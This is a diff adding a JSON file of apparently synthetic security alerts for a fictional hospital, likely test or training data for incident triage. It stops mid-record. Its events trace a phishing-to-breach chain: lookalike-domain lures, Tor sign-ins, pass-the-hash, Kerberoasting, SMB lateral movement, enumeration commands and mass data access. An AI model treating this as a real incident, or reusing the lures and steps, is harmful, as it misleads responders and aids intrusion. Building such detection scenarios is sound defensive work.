@@ -1,0 +1,4058 @@
+[
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:30:00Z",
+      "product_name": "Proofpoint",
+      "event_type": "phishing_detected"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "198.51.100.22"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "sender": "hr-update@mercy-hosp1tal.com",
+        "subject": "URGENT: Benefits Enrollment Deadline Today",
+        "url": "http://mercy-portal-login.co/sso",
+        "action": "delivered"
+      }
+    },
+    "target": {
+      "hostname": "MAIL-GW-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:31:00Z",
+      "product_name": "Proofpoint",
+      "event_type": "phishing_detected"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "198.51.100.22"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "sender": "benefits@mercy-hosp1tal.com",
+        "subject": "Open Enrollment Reminder",
+        "url": "http://mercy-portal-login.co/enroll",
+        "action": "link_clicked"
+      }
+    },
+    "target": {
+      "hostname": "MAIL-GW-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:32:00Z",
+      "product_name": "Proofpoint",
+      "event_type": "phishing_detected"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "198.51.100.22"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "sender": "it-helpdesk@mercy-h0spital.com",
+        "subject": "Password Expiry Notice - Action Required",
+        "url": "http://mercy-portal-login.co/reset",
+        "action": "delivered"
+      }
+    },
+    "target": {
+      "hostname": "MAIL-GW-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:33:00Z",
+      "product_name": "Proofpoint",
+      "event_type": "phishing_detected"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "198.51.100.22"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "sender": "it-support@mercy-h0spital.com",
+        "subject": "VPN Certificate Expiring",
+        "url": "http://mercy-portal-login.co/vpn",
+        "action": "delivered"
+      }
+    },
+    "target": {
+      "hostname": "MAIL-GW-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:34:00Z",
+      "product_name": "Proofpoint",
+      "event_type": "phishing_detected"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "198.51.100.22"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "sender": "admin@mercy-hosp1tal.com",
+        "subject": "Mandatory HIPAA Training - Complete Now",
+        "url": "http://mercy-portal-login.co/hipaa",
+        "action": "delivered"
+      }
+    },
+    "target": {
+      "hostname": "MAIL-GW-03"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:35:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-backup@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "veeam-agent.exe",
+        "action": "scheduled_backup"
+      }
+    },
+    "target": {
+      "hostname": "BACKUP-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:37:00Z",
+      "product_name": "Defender",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-scheduler@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "TaskScheduler.exe",
+        "action": "shift_assignment_update"
+      }
+    },
+    "target": {
+      "hostname": "SCHED-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:38:00Z",
+      "product_name": "Okta",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "New device sign-in",
+        "device": "Linux Chrome 120.0",
+        "mfa": "not_prompted"
+      }
+    },
+    "target": {
+      "hostname": "OKTA-SSO"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:39:00Z",
+      "product_name": "Defender",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-print@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "spoolsv.exe",
+        "action": "service_running"
+      }
+    },
+    "target": {
+      "hostname": "PRINT-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:40:00Z",
+      "product_name": "Okta",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Impossible travel detected",
+        "last_location": "Chicago, US",
+        "current_location": "Frankfurt, DE"
+      }
+    },
+    "target": {
+      "hostname": "OKTA-SSO"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:41:00Z",
+      "product_name": "Defender",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-fax@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "faxservice.exe",
+        "action": "incoming_fax",
+        "pages": 3
+      }
+    },
+    "target": {
+      "hostname": "FAX-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:42:00Z",
+      "product_name": "Okta",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Tor exit node IP detected",
+        "tor_confidence": "HIGH"
+      }
+    },
+    "target": {
+      "hostname": "OKTA-SSO"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:44:00Z",
+      "product_name": "Okta",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Multiple failed logins before success",
+        "failed_count": 8
+      }
+    },
+    "target": {
+      "hostname": "OKTA-SSO"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:45:00Z",
+      "product_name": "Defender",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-monitoring@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "Nagios Agent",
+        "reason": "scheduled_restart"
+      }
+    },
+    "target": {
+      "hostname": "MON-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:46:00Z",
+      "product_name": "Okta",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Failed MFA challenge",
+        "mfa_method": "SMS",
+        "attempts": 3
+      }
+    },
+    "target": {
+      "hostname": "OKTA-SSO"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:48:00Z",
+      "product_name": "Okta",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Login from previously unseen ASN",
+        "asn": "AS24940 Hetzner"
+      }
+    },
+    "target": {
+      "hostname": "OKTA-SSO"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:49:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-imaging@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "dcm4chee.exe",
+        "action": "dicom_store_complete",
+        "studies": 12
+      }
+    },
+    "target": {
+      "hostname": "PACS-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:50:00Z",
+      "product_name": "Okta",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Session token reuse from different IP",
+        "original_ip": "10.10.5.15"
+      }
+    },
+    "target": {
+      "hostname": "OKTA-SSO"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:52:00Z",
+      "product_name": "Okta",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Credential stuffing pattern",
+        "failed_attempts_1h": 12
+      }
+    },
+    "target": {
+      "hostname": "OKTA-SSO"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:54:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "dr.williams@mercy-hospital.org"
+      },
+      "ip": "10.10.5.30"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "Epic EHR Portal",
+        "location": "Chicago, US",
+        "mfa": "verified"
+      }
+    },
+    "target": {
+      "hostname": "WS-DRWILLIAMS"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:55:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "MEDIUM"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "application": "Epic EHR Portal",
+        "session_id": "sess-a8f3c21d"
+      }
+    },
+    "target": {
+      "hostname": "EHR-PORTAL-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:57:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-dns@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "Unbound DNS",
+        "reason": "cache_flush"
+      }
+    },
+    "target": {
+      "hostname": "DNS-SRV-02"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T06:58:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "MEDIUM"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "application": "Cisco AnyConnect VPN",
+        "tunnel_ip": "10.10.50.88"
+      }
+    },
+    "target": {
+      "hostname": "VPN-GW-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:00:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-antivirus@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "MsMpEng.exe",
+        "action": "definition_update"
+      }
+    },
+    "target": {
+      "hostname": "AV-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:02:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "MEDIUM"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "application": "Citrix Workspace",
+        "session_id": "ctx-9e2b44f1"
+      }
+    },
+    "target": {
+      "hostname": "CITRIX-GW-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:03:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "nurse.jones@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Port scan from VPN tunnel",
+        "ports_scanned": "22,445,3389,1433,5432",
+        "source": "10.10.50.88"
+      }
+    },
+    "target": {
+      "hostname": "FW-EDGE-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:04:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "pharmacist.lee@mercy-hospital.org"
+      },
+      "ip": "10.10.6.15"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "PharmacyDispense Portal",
+        "location": "Chicago, US",
+        "mfa": "verified"
+      }
+    },
+    "target": {
+      "hostname": "PHARM-WS-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:05:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "dr.smith@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Pass-the-hash detected",
+        "source_host": "EHR-PORTAL-01"
+      }
+    },
+    "target": {
+      "hostname": "WS-DRSMITH-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:06:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "dr.smith@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "VPN session from foreign IP",
+        "location": "Frankfurt, DE"
+      }
+    },
+    "target": {
+      "hostname": "VPN-GW-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:07:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "dr.smith@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Unusual RDP session",
+        "source_ip": "10.10.50.88"
+      }
+    },
+    "target": {
+      "hostname": "EHR-SERVER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:08:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "dr.smith@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Unusual service access",
+        "service": "PACS Imaging"
+      }
+    },
+    "target": {
+      "hostname": "RADIOLOGY-SRV"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:09:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-endpoint@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "csfalconservice.exe",
+        "action": "sensor_update"
+      }
+    },
+    "target": {
+      "hostname": "EDR-MGMT-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:09:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "dr.smith@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "First-time access to surgical scheduling",
+        "normal_access": false
+      }
+    },
+    "target": {
+      "hostname": "SURGERY-SCHED-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:10:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "New device sign-in from known-bad IP",
+        "device": "Unknown Windows"
+      }
+    },
+    "target": {
+      "hostname": "DC-MAIN"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:11:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "SMB lateral movement",
+        "destination": "10.10.20.10",
+        "shares_accessed": [
+          "C$",
+          "ADMIN$"
+        ]
+      }
+    },
+    "target": {
+      "hostname": "FW-INTERNAL-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:12:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Kerberoasting attempt",
+        "service_account": "svc-sql-ehr"
+      }
+    },
+    "target": {
+      "hostname": "AD-CONTROLLER-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:12:00Z",
+      "product_name": "Okta",
+      "event_type": "login_success"
+    },
+    "principal": {
+      "user": {
+        "userid": "tech.davis@mercy-hospital.org"
+      },
+      "ip": "10.10.2.8"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "geo": "US",
+      "raw_log": {
+        "application": "IT Helpdesk Portal",
+        "location": "Chicago, US",
+        "mfa": "verified"
+      }
+    },
+    "target": {
+      "hostname": "WS-TECH-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:13:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Enumeration activity",
+        "queries": [
+          "net group",
+          "net localgroup admins"
+        ]
+      }
+    },
+    "target": {
+      "hostname": "PRINT-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:14:00Z",
+      "product_name": "Defender",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-backup@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "robocopy.exe",
+        "action": "file_sync",
+        "files_copied": 342
+      }
+    },
+    "target": {
+      "hostname": "BACKUP-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:14:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Admin accessing backup server from unusual source",
+        "source_ip": "10.10.50.88"
+      }
+    },
+    "target": {
+      "hostname": "BACKUP-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:15:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "billing.patel@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Impossible travel detected",
+        "current_location": "Frankfurt, DE"
+      }
+    },
+    "target": {
+      "hostname": "BILLING-WS-03"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:16:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "billing.patel@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Unauthorized DB query",
+        "query_type": "SELECT * FROM employees"
+      }
+    },
+    "target": {
+      "hostname": "HR-DB-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:17:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "billing.patel@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Unusual database access",
+        "database": "BillingRecords"
+      }
+    },
+    "target": {
+      "hostname": "BILLING-DB-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:18:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "billing.patel@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "After-hours access",
+        "local_time": "02:48 CST"
+      }
+    },
+    "target": {
+      "hostname": "CLAIMS-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:18:00Z",
+      "product_name": "Defender",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-email@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "Microsoft Exchange Transport",
+        "reason": "certificate_renewal"
+      }
+    },
+    "target": {
+      "hostname": "EXCHANGE-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:19:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "billing.patel@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "RDP brute force from internal",
+        "source": "10.10.50.88",
+        "target": "10.10.30.5",
+        "attempts": 47
+      }
+    },
+    "target": {
+      "hostname": "FW-INTERNAL-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:20:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "lab.tech.wong@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Credential replay attack",
+        "original_session": "nurse.jones"
+      }
+    },
+    "target": {
+      "hostname": "LAB-WS-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:21:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "billing.patel@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Bulk query to insurance gateway",
+        "records_queried": 15000
+      }
+    },
+    "target": {
+      "hostname": "INSURANCE-GW-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:22:00Z",
+      "product_name": "Cisco ASA",
+      "event_type": "service_restart"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-network@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "service": "Cisco ASA daemon",
+        "reason": "config_reload"
+      }
+    },
+    "target": {
+      "hostname": "FW-EDGE-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:23:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "lab.tech.wong@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Cross-department access anomaly",
+        "normal_dept": "Laboratory",
+        "accessed_dept": "Pharmacy"
+      }
+    },
+    "target": {
+      "hostname": "PHARMACY-SRV"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:24:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "lab.tech.wong@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "DICOM server access from lab account",
+        "protocol": "DICOM",
+        "studies_accessed": 342
+      }
+    },
+    "target": {
+      "hostname": "IMAGING-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:25:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "lab.tech.wong@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Unusual service access pattern",
+        "service": "LabResultsAPI"
+      }
+    },
+    "target": {
+      "hostname": "LAB-RESULTS-SRV"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:26:00Z",
+      "product_name": "CrowdStrike",
+      "event_type": "suspicious_signin"
+    },
+    "principal": {
+      "user": {
+        "userid": "admin.chen@mercy-hospital.org"
+      },
+      "ip": "185.220.101.44"
+    },
+    "security_result": {
+      "severity": "HIGH"
+    },
+    "additional": {
+      "geo": "DE",
+      "raw_log": {
+        "reason": "Mailbox export initiated",
+        "target_mailbox": "cfo@mercy-hospital.org"
+      }
+    },
+    "target": {
+      "hostname": "EXCHANGE-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:26:00Z",
+      "product_name": "Defender",
+      "event_type": "benign_process"
+    },
+    "principal": {
+      "user": {
+        "userid": "svc-cert@mercy-hospital.org"
+      },
+      "ip": "10.10.1.1"
+    },
+    "security_result": {
+      "severity": "LOW"
+    },
+    "additional": {
+      "raw_log": {
+        "process": "certsvc.exe",
+        "action": "certificate_issued",
+        "template": "WebServer"
+      }
+    },
+    "target": {
+      "hostname": "CA-SRV-01"
+    }
+  },
+  {
+    "metadata": {
+      "event_timestamp": "2026-04-10T07:27:00Z",
